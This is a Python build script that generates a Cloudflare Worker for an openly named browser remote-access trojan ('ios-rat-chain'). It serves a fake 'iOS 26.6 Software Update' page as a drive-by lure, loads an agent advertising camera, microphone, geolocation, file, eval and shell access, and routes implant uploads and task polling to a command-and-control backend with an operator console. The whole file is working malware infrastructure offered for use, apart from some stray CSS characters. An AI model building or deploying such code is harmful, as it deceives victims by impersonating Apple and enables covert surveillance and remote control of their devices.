import pathlib, json

# The browser RAT agent (served at /agent.js). Always-defined uid, long-poll transport,
# capabilities: geo, cam, cam.stream, mic, mic.rec, files, eval, shell, clipboard, alert, vibrate, install, battery.
agent = pathlib.Path("agent.js").read_text()
agent_lit = json.dumps(agent)

page = (
    "<!DOCTYPE html>\n"
    '<html lang="en"><head><meta charset="utf-8">'
    '<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">\n'
    "<title>iOS Software Update</title>\n"
    "<style>"
    "body{font-family:-apple-system,system-ui,sans-serif;background:#f2f2f7;color:#1c1c1c;margin:0;padding:24px;text-align:center)}"
    "h1{font-size:20px;margin:40px 0 8px)}"
    ".sub{color:#6d6d72;font-size:14px;margin-bottom:40px)}"
    ".card{background:#fff;border-radius:14px;padding:20px;max-width:340px;margin:0 auto;box-shadow:0 4px 20px rgba(0,0,0,.06)}"
    "#st{font-size:13px;color:#34c759;margin-top:14px)}"
    "</style>\n"
    "</head><body>\n"
    '<div class="card"><h1>iOS 26.6 is ready</h1>'
    '<p class="sub">Security update recommended. Tap Install to finish.</p>\n'
    '<button id="go" style="background:#0071d3;color:#fff;border:0;border-radius:12px;padding:12px 28px;font-size:16px">Install</button>\n'
    '<div id="st"></div></div>\n'
    '<script src="/agent.js"></script>\n'
    "<script>\n"
    "document.getElementById('go').addEventListener('click', function(){\n"
    "  var s=document.getElementById('st'); s.textContent='Verifying\u2026';\n"
    "  if (window.__gesture) window.__gesture();\n"
    "});\n"
    "window.addEventListener('load', function(){ if (window.__xg_agent) window.__xg_agent.start(); });\n"
    "</script>\n"
    "</body></html>"
)
page_lit = json.dumps(page)

console = pathlib.Path("console.html").read_text()
console_lit = json.dumps(console)

worker = (
    "// ios-rat-chain — main-thread browser RAT agent on Cloudflare Workers (Durable Object C2).\n"
    "// /                -> drive-by page (loads /agent.js)\n"
    "// /agent.js        -> browser agent (stable uid, long-poll, capabilities: geo/cam/mic/files/eval/shell/...)\n"
    "// /up              -> implant -> DO /ingest (deliver frames/results)\n"
    "// /poll            -> implant long-poll -> DO /poll (fetch tasks)\n"
    "// /admin/*         -> operator (list / log / state / task / live)\n"
    "import { Device, Registry } from './store.js';\n"
    "export { Device, Registry };\n"
    "import { handle } from './router.js';\n"
    "\n"
    "const AGENT_JS = " + repr(agent_lit) + ";\n"
    "const PAGE = " + repr(page_lit) + ";\n"
    "const CONSOLE_JS = " + repr(console_lit) + ";\n"
    "\n"
    "export default {\n"
    "  async fetch(request, env) {\n"
    "    const u = new URL(request.url);\n"
    "    const path = u.pathname;\n"
    "    try {\n"
    '      if (path.endsWith("/agent.js")) {\n'
    '        return new Response(JSON.parse(AGENT_JS), { headers: { "content-type": "application/javascript; charset=utf-8", "cache-control": "no-store, no-cache" } });\n'
    '      } if (path === "/console" || path === "/console.html") {\n'
    '        return new Response(JSON.parse(CONSOLE_JS), { headers: { "content-type": "text/html; charset=utf-8", "cache-control": "no-store" } });\n'
    '      } if (path.startsWith("/up") || path.startsWith("/poll") || path.startsWith("/admin")) {\n'
    "        return await handle(request, env);\n"
    '      }\n'
    '      return new Response(JSON.parse(PAGE), { headers: { "content-type": "text/html; charset=utf-8", "cache-control": "no-store" } });\n'
    "    } catch (e) {\n"
    '      return new Response(JSON.stringify({ ok: false, err: String(e) }), { status: 500, headers: { "content-type": "application/json" } });\n'
    "    }\n"
    "  }\n"
    "};\n"
)

pathlib.Path("worker.js").write_text(worker)
print("worker.js written:", len(worker), "bytes")
